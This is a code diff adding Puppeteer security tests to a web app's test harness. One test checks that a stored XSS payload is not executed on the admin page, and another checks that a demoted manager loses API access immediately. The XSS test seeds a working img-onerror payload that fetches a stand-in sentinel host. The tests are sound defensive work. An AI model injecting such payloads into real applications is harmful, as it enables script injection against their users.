@@ -10,6 +10,7 @@ let puppeteer = null;
 try { puppeteer = require('puppeteer'); } catch { /* optional */ }
 
 const { BASE, PASSWORD, ROLES, login } = require('./harness');
+const { Pool } = require('pg');
 
 function parseCookieKV(jar) {
   // jar is like "connect.sid=s%3A..." (already trimmed by parseSetCookie)
@@ -166,6 +167,121 @@ async function runUiSmoke({ users, runId, clients }) {
         'medium', consoleErrors.length === 0);
 
       await page.close();
+    }
+    // ── XSS render non-execution (admin UI) ────────────────────────────────
+    // Seed a stored XSS payload through the public access-request endpoint,
+    // log in as admin in puppeteer, navigate to /admin, and assert:
+    //   (a) no pageerror or attacker-controlled fetch fires
+    //   (b) the payload is NOT present in any element's outerHTML as raw
+    //       script tags (only as HTML-escaped text inside text nodes)
+    // The harness covers data round-trip via probes.js; this probe verifies
+    // the rendered DOM does not execute the payload.
+    try {
+      const pool = new Pool({
+        connectionString: process.env.DATABASE_URL_TEST || process.env.DATABASE_URL,
+      });
+      const xssEmail = `privtest-uixss-${runId}@privtest.local`;
+      const sentinelHost = `xss-sentinel-${runId}.invalid`;
+      const xssPayload = `"><img src=x onerror="window.__xssFired=1;fetch('https://${sentinelHost}/?n=${runId}')">`;
+      await pool.query(
+        `INSERT INTO account_requests (name, email, status, created_at)
+         VALUES ($1, $2, 'pending', NOW())`, [xssPayload, xssEmail]);
+
+      const page = await browser.newPage();
+      await page.setViewport({ width: 1280, height: 800 });
+      await page.setCacheEnabled(false);
+      const errs = [];
+      const evilHits = [];
+      page.on('pageerror', e => errs.push(e.message));
+      page.on('request', req => {
+        if (req.url().includes(sentinelHost)) evilHits.push(req.url());
+      });
+
+      const sess = await login(users.admin.email, PASSWORD);
+      const kv = parseCookieKV(sess.cookie);
+      if (kv) {
+        const { hostname } = new URL(BASE);
+        await page.setCookie({
+          name: kv.name, value: kv.value, domain: hostname,
+          path: '/', httpOnly: true,
+        });
+      }
+      await page.goto(`${BASE}/admin`, { waitUntil: 'networkidle2', timeout: 15000 }).catch(() => {});
+      await safeShot(page, path.join(SCREENSHOT_DIR, `${runId}-xss-render.png`));
+      const xssFired = await page.evaluate(() => !!window.__xssFired);
+      const html = await page.content();
+      // The payload must NOT appear as a raw <img onerror=…> tag in the DOM
+      // — only as a text-encoded string inside a cell.
+      const rawTagPresent = /<img\s+src=x\s+onerror=/i.test(html);
+
+      record('admin /admin renders the stored XSS payload as text, not script',
+        'no pageerror, no fetch to sentinel host, no raw <img onerror> in DOM',
+        `pageerrors=${errs.length} sentinelHits=${evilHits.length} xssFired=${xssFired} rawTag=${rawTagPresent}`,
+        'critical',
+        errs.length === 0 && evilHits.length === 0 && !xssFired && !rawTagPresent);
+      await page.close();
+      await pool.query(`DELETE FROM account_requests WHERE email = $1`, [xssEmail]);
+      await pool.end();
+    } catch (e) {
+      record('XSS render non-execution probe ran', 'no error',
+        `error: ${e.message}`, 'medium', false);
+    }
+
+    // ── Privilege downgrade UI staleness (Puppeteer, from already-open page) ─
+    // Open /admin as the manager, then have admin demote them to viewer via a
+    // separate session, then trigger an admin-only API call from the manager's
+    // already-loaded page. The fetch must return 401/403 — proving the gate
+    // re-reads role on every request rather than trusting the page's stale
+    // session cookie. This is the UI-level analogue of the API downgrade
+    // probe in probes.js.
+    try {
+      const pool = new Pool({
+        connectionString: process.env.DATABASE_URL_TEST || process.env.DATABASE_URL,
+      });
+      const page = await browser.newPage();
+      await page.setViewport({ width: 1280, height: 800 });
+      await page.setCacheEnabled(false);
+      const mgrSess = await login(users.manager.email, PASSWORD);
+      const kv = parseCookieKV(mgrSess.cookie);
+      const { hostname } = new URL(BASE);
+      if (kv) {
+        await page.setCookie({
+          name: kv.name, value: kv.value, domain: hostname,
+          path: '/', httpOnly: true,
+        });
+      }
+      // Manager hits a manager-only API to confirm baseline access.
+      await page.goto(`${BASE}/`, { waitUntil: 'domcontentloaded' });
+      const before = await page.evaluate(async (base) => {
+        const r = await fetch(`${base}/api/trades`, { credentials: 'include' });
+        return r.status;
+      }, BASE);
+
+      // Now demote via the admin's session (out-of-band).
+      const adminSess = await login(users.admin.email, PASSWORD);
+      await adminSess.patch(`/api/users/${users.manager.id}/profile`,
+        { privilege_level: 'viewer' });
+
+      // From the *same* already-loaded page, fire the same API call again.
+      const after = await page.evaluate(async (base) => {
+        const r = await fetch(`${base}/api/trades`, { credentials: 'include' });
+        return r.status;
+      }, BASE);
+      await safeShot(page, path.join(SCREENSHOT_DIR, `${runId}-downgrade-ui.png`));
+
+      record('demoted manager loses access from an already-open page (UI staleness)',
+        'before=200 (manager) → after in {401,403} (viewer)',
+        `before=${before} after=${after}`,
+        'critical', before === 200 && (after === 401 || after === 403));
+
+      // Restore the manager
+      await adminSess.patch(`/api/users/${users.manager.id}/profile`,
+        { privilege_level: 'manager' });
+      await page.close();
+      await pool.end();
+    } catch (e) {
+      record('privilege downgrade UI staleness probe ran', 'no error',
+        `error: ${e.message}`, 'medium', false);
     }
   } finally {
     await browser.close().catch(() => {});
